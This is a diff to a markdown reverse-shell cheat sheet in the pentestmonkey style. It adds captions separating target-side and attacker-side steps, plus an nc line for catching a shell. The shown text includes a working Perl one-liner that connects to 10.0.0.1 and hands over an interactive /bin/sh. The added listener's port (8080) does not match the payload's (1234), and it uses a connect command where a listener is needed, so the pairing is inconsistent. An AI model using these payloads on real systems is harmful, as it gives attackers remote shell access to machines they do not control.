@@ -24,11 +24,16 @@ nc -nv TARGET_IP 8080
 ```
 ## PERL
 Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) / http://pentestmonkey.net/tools/web-shells/perl-reverse-shell:
+$${\color{green}On\ the\ target\ machine:}$$
 ```bash
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell) / http://www.plenz.com/reverseshell.
 
+$${\color{blue}Catch\ the\ shell\ on\ attack\ machine:}$$
+```bash
+nc -nv TARGET_IP 8080
+```
 ## Python
 This was tested under Linux / Python 2.7:
 ```bash
